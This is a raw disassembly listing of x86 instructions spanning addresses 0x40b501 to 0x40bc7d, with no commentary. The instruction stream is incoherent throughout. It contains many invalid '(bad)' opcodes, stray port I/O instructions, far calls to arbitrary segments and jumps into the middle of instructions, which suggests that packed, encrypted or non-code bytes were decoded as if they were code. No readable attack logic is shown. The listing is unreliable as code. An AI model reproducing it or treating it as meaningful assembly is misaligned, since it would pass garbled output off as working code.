  40b501:	pop    ebx
  40b502:	cdq    
  40b503:	sbb    DWORD PTR [ecx-0x1c39305],esi
  40b509:	fldenv [ebp+eiz*8+0x15]
  40b50d:	in     al,0x6
  40b50f:	dec    edi
  40b510:	mov    eax,0xd0d06eca
  40b515:	push   0xf14432a0
  40b51a:	aas    
  40b51b:	cmp    esi,ecx
  40b51d:	adc    dh,al
  40b51f:	push   0x787c80ab
  40b524:	cmc    
  40b525:	popa   
  40b526:	xchg   esi,eax
  40b527:	test   al,0xe6
  40b529:	lock push esi
  40b52b:	push   es
  40b52c:	add    DWORD PTR [eax-0x2e],ebx
  40b52f:	pop    edi
  40b530:	sar    ecx,1
  40b532:	sub    al,0xc5
  40b534:	and    eax,0x7c0fd807
  40b539:	js     0x40b506
  40b53b:	jbe    0x40b592
  40b53d:	jae    0x40b594
  40b53f:	jae    0x40b536
  40b541:	rcl    bl,cl
  40b543:	repz (bad) 
  40b545:	cs jge 0x40b59d
  40b548:	mov    ds:0xc8b1ef3b,al
  40b54d:	xchg   ecx,ebp
  40b54f:	mul    DWORD PTR [ebp+eax*1-0x4352585a]
  40b556:	add    BYTE PTR [edx+0x78dc9804],al
  40b55c:	cmp    ch,BYTE PTR [edi+ebp*4+0x49609c2a]
  40b563:	or     edx,DWORD PTR [ebx+edi*4-0x7f09d6f3]
  40b56a:	ja     0x40b5a6
  40b56c:	jecxz  0x40b508
  40b56e:	dec    edx
  40b56f:	lock (bad) 
  40b571:	(bad)  [ecx]
  40b573:	jl     0x40b54f
  40b575:	cs push edx
  40b577:	cmp    DWORD PTR [ebx-0x5a],ebp
  40b57a:	(bad)  
  40b57c:	sahf   
  40b57d:	xchg   edi,eax
  40b57e:	ss pop esp
  40b580:	icebp  
  40b581:	or     DWORD PTR [esi+0x77],ebp
  40b584:	xchg   esp,eax
  40b585:	dec    esp
  40b586:	(bad)  
  40b587:	xchg   esi,eax
  40b588:	inc    ecx
  40b589:	test   eax,0xf3d03944
  40b58e:	in     al,dx
  40b58f:	push   esi
  40b590:	push   edi
  40b591:	jecxz  0x40b5e7
  40b593:	jno    0x40b583
  40b595:	sub    ecx,DWORD PTR [eax+0x12bbc332]
  40b59b:	sub    cl,dl
  40b59d:	pop    es
  40b59e:	mov    al,0x38
  40b5a0:	or     BYTE PTR [ecx-0x17d19082],bh
  40b5a6:	sub    bl,BYTE PTR [edx-0xb]
  40b5a9:	popf   
  40b5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ac:	xchg   ebp,eax
  40b5ad:	mov    esp,0x3b31c5f7
  40b5b2:	mov    al,ds:0xbf163dd5
  40b5b7:	js     0x40b624
  40b5b9:	je     0x40b601
  40b5bb:	fnstsw WORD PTR [esi+0x23]
  40b5be:	outs   dx,DWORD PTR ds:[esi]
  40b5bf:	sbb    eax,0x7fad1fd
  40b5c4:	sbb    eax,0xf339c402
  40b5c9:	adc    BYTE PTR [edi+0x6],bh
  40b5cc:	fist   DWORD PTR [eax+ecx*4+0x18]
  40b5d0:	sbb    esp,DWORD PTR [edx+0x39ee12de]
  40b5d6:	mov    ah,0xc9
  40b5d8:	or     bh,BYTE PTR [ebx]
  40b5da:	and    DWORD PTR [ebx+0x37],ebx
  40b5dd:	fxch   st(6)
  40b5df:	ret    
  40b5e0:	mov    dl,0x3b
  40b5e2:	push   0x720b5c28
  40b5e7:	(bad)  
  40b5e8:	and    esi,DWORD PTR [edi]
  40b5ea:	lea    edx,[ecx+0xf6e1299]
  40b5f0:	jno    0x40b655
  40b5f2:	stos   BYTE PTR es:[edi],al
  40b5f3:	cwde   
  40b5f4:	push   edx
  40b5f5:	cmp    eax,0xbfc5a6e7
  40b5fa:	scas   al,BYTE PTR es:[edi]
  40b5fb:	loope  0x40b5bd
  40b5fd:	loop   0x40b634
  40b5ff:	dec    ecx
  40b600:	adc    eax,0xf97b9ff3
  40b605:	inc    esi
  40b606:	outs   dx,DWORD PTR ds:[esi]
  40b607:	(bad)  
  40b608:	fnstcw WORD PTR [edx+edx*2+0x41]
  40b60c:	lock mov esi,0xf6f43945
  40b612:	xchg   esp,eax
  40b613:	fmul   st,st(6)
  40b615:	fidivr DWORD PTR [esi]
  40b617:	dec    edi
  40b618:	cmc    
  40b619:	dec    ebp
  40b61a:	ret    0x30dc
  40b61d:	jle    0x40b695
  40b61f:	shr    BYTE PTR [ebx+edi*1+0x4361fd66],cl
  40b626:	pop    edi
  40b627:	(bad)  
  40b628:	inc    edi
  40b629:	mov    esi,0x2c31a26e
  40b62e:	sub    edx,DWORD PTR [edi+0x78f392f2]
  40b634:	add    eax,0x15d2334f
  40b639:	xchg   BYTE PTR [ebp-0x24],bh
  40b63c:	in     al,0x1e
  40b63e:	(bad)  [edx-0x4385a7a3]
  40b644:	out    dx,al
  40b645:	imul   eax,DWORD PTR [ebp+0x7],0x9df519bf
  40b64c:	push   edi
  40b64d:	jl     0x40b5e4
  40b64f:	cs lahf 
  40b651:	mov    eax,ds:0xc7c9382e
  40b656:	in     eax,dx
  40b657:	lock cmc 
  40b659:	call   0xe93ee4e2
  40b65e:	adc    DWORD PTR [ebx],0x3e
  40b661:	push   ss
  40b662:	lods   eax,DWORD PTR ds:[esi]
  40b663:	fwait
  40b664:	adc    eax,0x2ff8be38
  40b669:	int3   
  40b66a:	cmp    ecx,DWORD PTR [ebp-0x1]
  40b66d:	int3   
  40b66e:	mov    ds:0x8e3b8454,al
  40b673:	jbe    0x40b6a1
  40b675:	ficom  DWORD PTR [esi+0x73380665]
  40b67b:	call   0xe841426d
  40b680:	mov    al,ds:0x6fbf6e32
  40b685:	and    DWORD PTR [ebx+0x37],0x2be53ad1
  40b68c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b68d:	inc    esp
  40b68e:	inc    esi
  40b68f:	rcl    DWORD PTR [ebp+0x5e],1
  40b692:	or     eax,0x588f2e48
  40b697:	test   BYTE PTR [ebp-0x7211531f],al
  40b69d:	addr16 iret 
  40b69f:	mov    ecx,0x8d30ebe5
  40b6a4:	jno    0x40b667
  40b6a6:	cs pop eax
  40b6a8:	jb     0x40b6b3
  40b6aa:	jb     0x40b700
  40b6ac:	cmp    eax,0xbf778d8b
  40b6b1:	(bad)  
  40b6b3:	and    bl,ah
  40b6b5:	out    dx,eax
  40b6b6:	sub    bl,BYTE PTR [eax+0x58be930b]
  40b6bc:	imul   BYTE PTR [eax-0x4e]
  40b6bf:	pop    esi
  40b6c0:	add    BYTE PTR [ebp+0x3b904b3a],bl
  40b6c6:	mov    edx,0xab753ca8
  40b6cb:	sar    BYTE PTR [ecx+0x34c88323],0xa5
  40b6d2:	sbb    DWORD PTR cs:[edi],ecx
  40b6d5:	jbe    0x40b6ce
  40b6d7:	pop    ebx
  40b6d8:	imul   edi,DWORD PTR [eax],0xaa7b9998
  40b6de:	pop    ebx
  40b6df:	sbb    ch,bl
  40b6e1:	loope  0x40b735
  40b6e3:	stc    
  40b6e4:	cmc    
  40b6e5:	in     al,0x97
  40b6e7:	mov    BYTE PTR [edx],al
  40b6e9:	fcmovnu st,st(7)
  40b6eb:	and    ah,BYTE PTR [ebp-0x412e7c5]
  40b6f1:	loop   0x40b712
  40b6f3:	xor    bl,ah
  40b6f5:	pop    ebp
  40b6f6:	lods   eax,DWORD PTR ds:[esi]
  40b6f7:	pop    ecx
  40b6f8:	or     DWORD PTR [eax],edi
  40b6fa:	sub    DWORD PTR [edx+ebx*1],0xffffffb2
  40b6fe:	fwait
  40b6ff:	mov    eax,0x2a09380a
  40b704:	test   bl,dh
  40b706:	rcr    DWORD PTR [di],cl
  40b709:	(bad)  [esi-0x1f]
  40b70c:	sar    DWORD PTR [edx],cl
  40b70e:	arpl   WORD PTR [eax+0x3927cd26],ax
  40b714:	shr    BYTE PTR [ebp-0x102face8],0xb3
  40b71b:	inc    edi
  40b71c:	cmc    
  40b71d:	sub    eax,0x772a3fa1
  40b722:	lds    ebx,FWORD PTR [edi+0x31]
  40b725:	cmp    BYTE PTR [esi+0x62],dh
  40b728:	mov    DWORD PTR [ecx-0x298ecb5d],edx
  40b72e:	(bad)  
  40b72f:	aaa    
  40b730:	push   esp
  40b731:	cmp    BYTE PTR [edx+0x53a35849],ch
  40b737:	fs jb  0x40b71a
  40b73a:	retf   0x637f
  40b73d:	outs   dx,BYTE PTR ds:[esi]
  40b73e:	push   ds
  40b73f:	shl    ebp,cl
  40b741:	adc    DWORD PTR [esi],0x5f4e9f5f
  40b747:	je     0x40b6e6
  40b749:	rol    DWORD PTR [ebx+0x6ee4a367],cl
  40b74f:	add    eax,0x848645c4
  40b754:	mov    dh,0x3b
  40b756:	in     eax,0xe7
  40b758:	or     DWORD PTR [ebx+0x7b],ecx
  40b75b:	(bad)  
  40b75c:	adc    BYTE PTR [esi-0x7a0a681c],dh
  40b762:	sub    dl,dh
  40b764:	mov    ecx,DWORD PTR [edi+0x385cc1cb]
  40b76a:	gs jb  0x40b7c4
  40b76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76e:	adc    dh,BYTE PTR [eax]
  40b770:	mov    esp,0xab5b6eaf
  40b775:	lods   al,BYTE PTR ds:[esi]
  40b776:	je     0x40b79b
  40b778:	ins    DWORD PTR es:[di],dx
  40b77a:	mov    WORD PTR [eax],?
  40b77c:	xchg   DWORD PTR [edi],edi
  40b77e:	pop    ebx
  40b77f:	ins    DWORD PTR es:[edi],dx
  40b780:	ss out 0xb2,eax
  40b783:	push   ebx
  40b784:	cmc    
  40b785:	cmovg  edx,DWORD PTR [ebx-0x4d]
  40b789:	nop
  40b78a:	jns    0x40b77a
  40b78c:	stos   DWORD PTR es:[edi],eax
  40b78d:	sbb    BYTE PTR [ecx+0x5aa40bb7],dl
  40b793:	aas    
  40b794:	mov    dl,0x4e
  40b796:	das    
  40b797:	mov    edx,0xd8ce1f19
  40b79c:	jae    0x40b752
  40b79e:	cmp    ah,0xc3
  40b7a1:	aad    0x2e
  40b7a3:	in     eax,dx
  40b7a4:	mov    esi,0x755966d7
  40b7a9:	adc    BYTE PTR [esi-0x618a49c8],0xe
  40b7b0:	pop    ebx
  40b7b1:	addr16 mov ds:0x110a,eax
  40b7b5:	aaa    
  40b7b6:	iret   
  40b7b7:	add    ch,BYTE PTR [ecx-0x4a2299a6]
  40b7bd:	lods   eax,DWORD PTR es:[esi]
  40b7bf:	pop    es
  40b7c0:	gs cmp eax,0xe2affe35
  40b7c6:	ja     0x40b815
  40b7c8:	lea    ecx,[edi+eax*1]
  40b7cb:	adc    ebp,esi
  40b7cd:	mov    edi,0x5804a282
  40b7d2:	leave  
  40b7d3:	(bad)  
  40b7d5:	or     edi,esi
  40b7d7:	jbe    0x40b7a9
  40b7d9:	scas   al,BYTE PTR es:[edi]
  40b7da:	scas   al,BYTE PTR es:[edi]
  40b7db:	leave  
  40b7dc:	sub    DWORD PTR [edi+0x1b],eax
  40b7df:	repz imul DWORD PTR [ecx]
  40b7e2:	sub    ch,BYTE PTR ds:0xd92b98e3
  40b7e8:	mov    bh,0xd3
  40b7ea:	jne    0x40b7b2
  40b7ec:	jle    0x40b826
  40b7ee:	fild   QWORD PTR [ebp+0x42]
  40b7f1:	xor    ah,al
  40b7f3:	add    DWORD PTR [ebp-0x34],eax
  40b7f6:	fidivr DWORD PTR [edx]
  40b7f8:	cmc    
  40b7f9:	leave  
  40b7fa:	jnp    0x40b825
  40b7fc:	push   esi
  40b7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7fe:	inc    edi
  40b7ff:	mov    DWORD PTR [eax],ebx
  40b801:	pop    es
  40b802:	push   esi
  40b803:	aas    
  40b804:	aad    0x3b
  40b806:	jle    0x40b818
  40b808:	dec    esi
  40b809:	ja     0x40b83d
  40b80b:	xchg   ch,dh
  40b80d:	mov    BYTE PTR [edx],bh
  40b80f:	cs retf 
  40b811:	cmp    al,0xe6
  40b813:	test   DWORD PTR [eax+0xd],ecx
  40b816:	xor    BYTE PTR [ebp+0x1e553873],dh
  40b81c:	push   edi
  40b81d:	mov    WORD PTR [eax-0x553b1763],?
  40b823:	fld    DWORD PTR [edi+0x3b48fa26]
  40b829:	ja     0x40b870
  40b82b:	dec    ebp
  40b82c:	mov    dl,0x3b
  40b82e:	sbb    bh,0x3c
  40b831:	dec    edi
  40b832:	xchg   esp,eax
  40b833:	sub    BYTE PTR [esi-0xa01d9e8],0x1a
  40b83a:	fbld   TBYTE PTR [eax-0x9]
  40b83d:	mov    bh,0x6d
  40b83f:	or     al,0x19
  40b841:	cmp    BYTE PTR [esi-0x74],bl
  40b844:	(bad)  
  40b845:	loop   0x40b805
  40b847:	jl     0x40b85e
  40b849:	and    DWORD PTR [esi+0x2e82562f],ecx
  40b84f:	cli    
  40b850:	dec    eax
  40b851:	mov    cl,0x75
  40b853:	mov    al,0x2c
  40b855:	out    0x85,al
  40b857:	cmc    
  40b858:	jne    0x40b8d3
  40b85a:	rcr    DWORD PTR [ebx+0x4bcf8cdd],1
  40b860:	call   0xccac8c95
  40b865:	dec    esi
  40b866:	shl    BYTE PTR [eax+0x3c178c0d],cl
  40b86c:	add    al,0x86
  40b86e:	sahf   
  40b86f:	and    edx,DWORD PTR [esi]
  40b871:	and    ah,BYTE PTR [esi]
  40b873:	test   eax,0xcf72ea6b
  40b878:	cmc    
  40b879:	push   cs
  40b87a:	cmp    BYTE PTR [edi+0x2ae6857],cl
  40b880:	ftst   
  40b882:	inc    ebx
  40b883:	sbb    ch,BYTE PTR [ecx+edx*8+0x12]
  40b887:	mov    al,ds:0x9613d85e
  40b88c:	sbb    ebp,DWORD PTR [esi+0x6e7dc96e]
  40b892:	or     al,0xc
  40b894:	fdiv   QWORD PTR [edx+0x35153874]
  40b89a:	les    edi,FWORD PTR [esp+ebx*1]
  40b89d:	loope  0x40b849
  40b89f:	in     eax,dx
  40b8a0:	cmc    
  40b8a1:	and    cl,BYTE PTR [ecx]
  40b8a3:	(bad)  
  40b8a4:	and    cl,BYTE PTR [esi-0x6b4d481]
  40b8aa:	sar    BYTE PTR ds:0x4ad241f6,cl
  40b8b0:	loope  0x40b86c
  40b8b2:	mov    dl,0x6c
  40b8b4:	mov    edi,0x7536a17b
  40b8b9:	cmp    BYTE PTR [ebp+eiz*1-0x7a],bh
  40b8bd:	add    eax,0x3d1465b3
  40b8c2:	push   eax
  40b8c3:	jecxz  0x40b8c8
  40b8c5:	push   ecx
  40b8c6:	pusha  
  40b8c7:	push   esi
  40b8c8:	mov    ch,0x8d
  40b8ca:	popa   
  40b8cb:	shl    ch,cl
  40b8cd:	scas   al,BYTE PTR es:[edi]
  40b8ce:	mov    eax,ds:0x89cd962c
  40b8d3:	nop
  40b8d4:	mov    dl,0x3b
  40b8d6:	cmp    al,0xec
  40b8d8:	pop    es
  40b8d9:	add    ecx,DWORD PTR [edi-0x78]
  40b8dc:	cmp    BYTE PTR [ecx],ah
  40b8de:	outs   dx,DWORD PTR ds:[esi]
  40b8df:	push   ebx
  40b8e0:	ds and al,0xda
  40b8e3:	and    al,0xc4
  40b8e5:	mov    ch,bl
  40b8e7:	mov    al,ds:0xb3000449
  40b8ec:	gs js  0x40b92a
  40b8ef:	mov    esp,0xdc17a78b
  40b8f4:	mul    BYTE PTR [edi]
  40b8f6:	pop    esi
  40b8f7:	mov    cl,0x56
  40b8f9:	ret    0xa184
  40b8fc:	lds    esp,FWORD PTR [ebx]
  40b8fe:	fwait
  40b8ff:	and    al,0xf4
  40b901:	adc    BYTE PTR [edx+0x4cc5267d],dh
  40b907:	mov    ecx,0xe1cf8bec
  40b90c:	cmc    
  40b90d:	sti    
  40b90e:	stos   DWORD PTR es:[edi],eax
  40b90f:	call   0xe6c4:0xef66b853
  40b916:	ja     0x40b8bd
  40b918:	cmc    
  40b919:	shl    BYTE PTR ds:0x20b91361,1
  40b91f:	push   ebp
  40b921:	jae    0x40b8af
  40b923:	and    BYTE PTR [ecx+ecx*1+0x63],0xd7
  40b928:	call   0x8558155e
  40b92d:	jmp    0x4705b27e
  40b932:	xchg   ebp,eax
  40b933:	cld    
  40b934:	cmc    
  40b935:	(bad)  
  40b936:	fiadd  WORD PTR [eax+0x2c]
  40b939:	mov    DWORD PTR [edx+0x62],eax
  40b93c:	sbb    eax,0x39dd0a09
  40b941:	mov    ah,0x62
  40b943:	mov    ecx,0x7914ed87
  40b948:	ret    0x6f5b
  40b94b:	call   0x90f8807a
  40b950:	scas   eax,DWORD PTR es:[edi]
  40b951:	sahf   
  40b952:	outs   dx,DWORD PTR ds:[esi]
  40b953:	sub    eax,edi
  40b955:	cdq    
  40b956:	xchg   ebp,eax
  40b957:	shl    DWORD PTR [ebp-0x6d],cl
  40b95a:	hlt    
  40b95b:	mov    ebx,0x1d6ed30b
  40b960:	sub    eax,0xb284c057
  40b965:	inc    ecx
  40b966:	fdivr  QWORD PTR [eax]
  40b968:	daa    
  40b969:	pop    ecx
  40b96a:	cmp    bh,ah
  40b96c:	pop    ecx
  40b96d:	dec    edx
  40b96e:	fnsave [esi-0xb]
  40b971:	ffreep st(6)
  40b973:	sub    eax,0x8efc8e97
  40b978:	fidivr DWORD PTR [edx]
  40b97a:	(bad)  
  40b97b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b97c:	adc    edx,DWORD PTR [edi+esi*2+0x48]
  40b980:	inc    ebp
  40b981:	inc    eax
  40b982:	cmp    al,0x46
  40b984:	jg     0x40b90c
  40b986:	outs   dx,BYTE PTR ds:[esi]
  40b987:	inc    edx
  40b989:	lahf   
  40b98a:	push   es
  40b98b:	cmp    al,0xe
  40b98d:	ret    
  40b98e:	sub    al,0x39
  40b990:	sbb    esi,DWORD PTR [edi+0x44c916b1]
  40b996:	loope  0x40b954
  40b998:	std    
  40b999:	call   0x4bc4040c
  40b99e:	adc    dh,BYTE PTR [ebp+0x14]
  40b9a1:	xchg   DWORD PTR [esi+0x1a],esi
  40b9a4:	(bad)  
  40b9a5:	ins    BYTE PTR es:[edi],dx
  40b9a6:	xor    eax,0xe10248b9
  40b9ab:	adc    cl,BYTE PTR [ebx+eax*1-0x7346ea92]
  40b9b2:	fisub  WORD PTR [esi+0x54acb6c0]
  40b9b8:	mov    ?,WORD PTR [ebx]
  40b9ba:	aas    
  40b9bb:	icebp  
  40b9bc:	inc    ebx
  40b9bd:	lahf   
  40b9be:	jo     0x40ba0c
  40b9c0:	mov    bl,ch
  40b9c2:	pop    eax
  40b9c3:	out    dx,eax
  40b9c4:	cmc    
  40b9c5:	fiadd  DWORD PTR [edi-0x1]
  40b9c8:	jns    0x40b9d5
  40b9ca:	test   eax,0xad38475f
  40b9cf:	retfw  0xf7cb
  40b9d3:	sub    al,0x7f
  40b9d5:	fild   QWORD PTR [esi-0x47]
  40b9d8:	mov    esi,0xaa6a3e91
  40b9dd:	addr16 xor eax,0xb632e339
  40b9e3:	cs (bad) 
  40b9e6:	(bad)  
  40b9e7:	shr    BYTE PTR ds:0xd4395425,1
  40b9ed:	xchg   BYTE PTR [ecx+edi*4+0x38982409],ah
  40b9f4:	pop    edi
  40b9f5:	lahf   
  40b9f6:	or     DWORD PTR [esi],0xb
  40b9f9:	retf   0x4a36
  40b9fc:	div    BYTE PTR [eax-0x3058d417]
  40ba02:	xor    al,0xe3
  40ba04:	leave  
  40ba05:	mov    esi,0xdd203932
  40ba0a:	xchg   edi,eax
  40ba0b:	push   ss
  40ba0c:	pop    ds
  40ba0d:	aad    0xb5
  40ba0f:	retf   
  40ba10:	or     ecx,edi
  40ba12:	rcl    BYTE PTR [edi-0x51ead00b],cl
  40ba18:	push   eax
  40ba19:	jge    0x40b9db
  40ba1b:	aas    
  40ba1c:	scas   al,BYTE PTR es:[edi]
  40ba1d:	add    al,0xcd
  40ba1f:	inc    eax
  40ba20:	mov    ch,0xe0
  40ba22:	pop    ss
  40ba23:	push   cs
  40ba24:	(bad)  [ebx-0x1a]
  40ba27:	adc    ebp,esi
  40ba29:	jnp    0x40ba1f
  40ba2b:	cli    
  40ba2c:	sub    al,0xd5
  40ba2e:	xchg   edx,eax
  40ba2f:	inc    esi
  40ba30:	cmp    BYTE PTR fs:[edx+0x5c1ddab4],ah
  40ba37:	pop    edx
  40ba38:	out    0xe5,eax
  40ba3a:	outs   dx,BYTE PTR ds:[esi]
  40ba3b:	call   0xa8c7:0xaed04506
  40ba42:	cmp    al,0x30
  40ba44:	xor    eax,0x9660eb69
  40ba49:	fldcw  WORD PTR [esi+eax*2+0x3ef06ebf]
  40ba51:	xor    BYTE PTR [ecx-0x50],bl
  40ba54:	in     al,0xec
  40ba56:	pusha  
  40ba57:	cmp    DWORD PTR [eax],esi
  40ba59:	mov    DWORD PTR [ebx],esi
  40ba5b:	jae    0x40b9df
  40ba5d:	mov    bl,0xde
  40ba5f:	or     BYTE PTR [ecx],dl
  40ba61:	mov    bh,0x4
  40ba63:	imul   esi,ebp,0xffffff95
  40ba66:	pop    esi
  40ba67:	mov    ebx,0x2bf4784d
  40ba6c:	fsubrp st(3),st
  40ba6e:	xor    al,0xa9
  40ba70:	xchg   ebp,eax
  40ba71:	in     al,0x98
  40ba73:	inc    esi
  40ba74:	pop    eax
  40ba75:	xlat   BYTE PTR ds:[ebx]
  40ba76:	outs   dx,BYTE PTR ds:[esi]
  40ba77:	xor    cl,BYTE PTR [edi-0x24]
  40ba7a:	xchg   DWORD PTR [eax-0x60],edi
  40ba7d:	cmc    
  40ba7e:	dec    edi
  40ba7f:	cmp    DWORD PTR [esi],edx
  40ba81:	(bad)  
  40ba82:	cmp    BYTE PTR [esi],0x54
  40ba85:	sub    esp,0x6568f599
  40ba8b:	inc    ecx
  40ba8c:	pusha  
  40ba8d:	jo     0x40ba1b
  40ba8f:	ror    DWORD PTR [edi],0x36
  40ba92:	fstp   QWORD PTR [ebx+edx*8+0x5]
  40ba96:	dec    esi
  40ba97:	push   ebx
  40ba98:	les    esp,FWORD PTR [ecx+0x78]
  40ba9b:	das    
  40ba9c:	sub    DWORD PTR gs:[esi+0x60],0x923b9c0c
  40baa4:	lods   eax,DWORD PTR ds:[esi]
  40baa5:	rcr    ebx,0x38
  40baa8:	inc    eax
  40baa9:	adc    bl,BYTE PTR [edx+edi*1+0x660e77a0]
  40bab0:	js     0x40ba48
  40bab2:	outs   dx,BYTE PTR ds:[esi]
  40bab3:	and    DWORD PTR [edx-0x5e],0xfffffffb
  40bab7:	jno    0x40badc
  40bab9:	jl     0x40ba65
  40babb:	cmp    BYTE PTR [ecx*1+0x7ac65fb0],al
  40bac2:	aaa    
  40bac3:	adc    DWORD PTR [eax+0x39],edi
  40bac6:	test   eax,edi
  40bac8:	sahf   
  40bac9:	mov    BYTE PTR [edi+0x42],ch
  40bacc:	rcl    BYTE PTR [ebx-0x1a],cl
  40bacf:	inc    ecx
  40bad0:	std    
  40bad1:	and    eax,edi
  40bad3:	sbb    bl,BYTE PTR [ecx+ebx*2-0x42cd874a]
  40bada:	dec    ecx
  40badb:	outs   dx,BYTE PTR ds:[esi]
  40badc:	sbb    bl,BYTE PTR [esi-0x74]
  40badf:	sahf   
  40bae0:	add    al,0xd3
  40bae2:	neg    DWORD PTR cs:[edi-0x78]
  40bae6:	into   
  40bae7:	lock jg 0x40bb22
  40baea:	arpl   ax,ax
  40baec:	jae    0x40bb41
  40baee:	inc    esp
  40baef:	jp     0x40bb2e
  40baf1:	outs   dx,BYTE PTR ds:[esi]
  40baf3:	test   eax,0x7b6925cf
  40baf8:	push   edx
  40baf9:	cmp    DWORD PTR ds:0x563ba843,esp
  40baff:	xor    ch,BYTE PTR [esp+eax*8+0x6c]
  40bb03:	popa   
  40bb04:	inc    ebp
  40bb05:	jl     0x40bb5a
  40bb07:	dec    eax
  40bb08:	div    BYTE PTR [ecx]
  40bb0a:	pop    esp
  40bb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb0c:	dec    eax
  40bb0d:	mov    al,ds:0x9ba1621c
  40bb12:	sbb    bh,BYTE PTR [ecx]
  40bb14:	and    al,0x91
  40bb16:	imul   ebp,DWORD PTR [edi+0x1015204d],0xfffffff5
  40bb1d:	enter  0xbca8,0x19
  40bb21:	push   cs
  40bb22:	fdivr  DWORD PTR [ebx+0x1b47af9b]
  40bb28:	call   0x5bba01c8
  40bb2d:	sub    eax,0x8f63102d
  40bb32:	jl     0x40bb1f
  40bb34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb35:	stos   BYTE PTR es:[edi],al
  40bb36:	fistp  DWORD PTR [eax-0x71]
  40bb39:	daa    
  40bb3a:	cmp    BYTE PTR [edi-0x3b],dl
  40bb3d:	or     eax,0x383c6fe4
  40bb42:	mov    dh,0xa0
  40bb44:	sub    BYTE PTR [ecx+0x5b],dl
  40bb47:	mov    esp,0x28a118f6
  40bb4c:	jno    0x40bb84
  40bb4e:	inc    eax
  40bb4f:	jmp    0x396352a9
  40bb54:	test   ch,cl
  40bb56:	adc    bl,BYTE PTR [ecx+0x49]
  40bb59:	call   0xac2d749a
  40bb5e:	and    ebx,DWORD PTR [eax]
  40bb60:	push   edx
  40bb61:	and    eax,0xb5b52346
  40bb66:	dec    BYTE PTR [edi]
  40bb68:	sub    bh,BYTE PTR [eax]
  40bb6a:	xchg   edx,eax
  40bb6b:	jb     0x40bbdb
  40bb6d:	sbb    dh,BYTE PTR [edx+0x766bfd8f]
  40bb73:	ja     0x40baf9
  40bb75:	outs   dx,DWORD PTR ds:[esi]
  40bb76:	aad    0x92
  40bb78:	push   ebp
  40bb79:	pop    ebp
  40bb7a:	enter  0x5e22,0x38
  40bb7e:	mov    esp,0x70dce64f
  40bb83:	sub    al,BYTE PTR [esi]
  40bb85:	les    ecx,FWORD PTR [edx+0x3e]
  40bb88:	xlat   BYTE PTR ds:[ebx]
  40bb89:	mov    edx,0xc9f50ae5
  40bb8e:	rcr    DWORD PTR [esi],cl
  40bb90:	fsubr  DWORD PTR [edi+0x3d3cc51d]
  40bb96:	mov    al,0xc3
  40bb98:	cmp    bh,BYTE PTR [ebx+0x3]
  40bb9b:	xchg   esp,eax
  40bb9c:	mov    ?,WORD PTR [ebx-0x75]
  40bb9f:	cmp    BYTE PTR [ebx+0x3f39d000],ch
  40bba5:	jp     0x40bb5d
  40bba7:	pop    esi
  40bba8:	xor    al,0x65
  40bbaa:	es jno 0x40bb92
  40bbad:	outs   dx,BYTE PTR ss:[esi]
  40bbaf:	push   ds
  40bbb0:	shr    DWORD PTR [ebx-0x71db4c80],cl
  40bbb6:	add    cl,BYTE PTR [ecx+0x58bca236]
  40bbbc:	and    DWORD PTR [ebx],edi
  40bbbe:	push   eax
  40bbbf:	ret    
  40bbc0:	push   es
  40bbc1:	mov    edi,0x478b5f2c
  40bbc6:	(bad)  
  40bbc7:	(bad)  
  40bbc8:	in     al,0x57
  40bbca:	push   es
  40bbcb:	stos   DWORD PTR es:[edi],eax
  40bbcc:	loopne 0x40bbb5
  40bbce:	cs mov al,0x2f
  40bbd1:	es mov dl,0xd6
  40bbd4:	xor    dh,BYTE PTR ds:0x6e587528
  40bbda:	cmc    
  40bbdb:	mov    ah,0x9b
  40bbdd:	mov    bl,0x6e
  40bbdf:	mov    esp,DWORD PTR [ebx+esi*2+0x21255e67]
  40bbe6:	adc    edi,DWORD PTR [ecx]
  40bbe8:	xor    eax,0x9487df0a
  40bbed:	lods   eax,DWORD PTR ds:[esi]
  40bbee:	xchg   esi,eax
  40bbef:	jle    0x40bc56
  40bbf1:	xchg   ebx,eax
  40bbf2:	jge    0x40bba9
  40bbf4:	ja     0x40bbbf
  40bbf6:	dec    esi
  40bbf7:	pop    edi
  40bbf8:	add    al,0xd4
  40bbfa:	(bad)  
  40bbfc:	xlat   BYTE PTR ds:[ebx]
  40bbfd:	test   ecx,edx
  40bbff:	cmp    BYTE PTR [eax+0x601c49b8],cl
  40bc05:	mov    edi,0xe3f5510f
  40bc0a:	xchg   ecx,eax
  40bc0b:	iret   
  40bc0c:	call   0x25823be2
  40bc11:	cmp    edi,DWORD PTR [ebp+0x5d92c6ba]
  40bc17:	arpl   WORD PTR [eax-0x18],si
  40bc1a:	imul   ebp,DWORD PTR [ebp+esi*8-0x48],0x914da94b
  40bc22:	cdq    
  40bc23:	mov    dh,0xe1
  40bc25:	add    BYTE PTR [edi-0x2021f5c8],0xf0
  40bc2c:	add    esp,esi
  40bc2e:	arpl   di,si
  40bc30:	xor    ch,dh
  40bc32:	jg     0x40bbec
  40bc34:	lds    eax,FWORD PTR [ebx+0x17]
  40bc37:	je     0x40bbd2
  40bc39:	xor    esi,DWORD PTR [eax+0x38]
  40bc3c:	mov    ebx,0x31474c32
  40bc41:	xor    DWORD PTR [edi+0x68],esp
  40bc44:	adc    esp,ebx
  40bc46:	pop    esp
  40bc47:	xor    esi,DWORD PTR [ebp+0x4b53be7d]
  40bc4d:	(bad)  
  40bc4e:	call   0x3:0xaf479438
  40bc55:	in     eax,0x3
  40bc57:	jbe    0x40bc4e
  40bc59:	repz lahf 
  40bc5b:	push   ss
  40bc5c:	push   ebp
  40bc5d:	inc    ebx
  40bc5e:	mov    esi,0x483860fe
  40bc63:	push   eax
  40bc64:	arpl   WORD PTR [eax],dx
  40bc66:	pop    edi
  40bc67:	int3   
  40bc68:	mov    al,ds:0x7f2d6e09
  40bc6d:	xlat   BYTE PTR ds:[ebx]
  40bc6e:	(bad)  
  40bc6f:	and    dl,bh
  40bc71:	(bad)  
  40bc72:	pop    ss
  40bc73:	cmp    DWORD PTR [ebx-0x5c],edi
  40bc76:	ret    0xc45b
  40bc79:	pop    edx
  40bc7a:	xor    BYTE PTR [edi-0xb],ah
  40bc7d:	inc    ecx
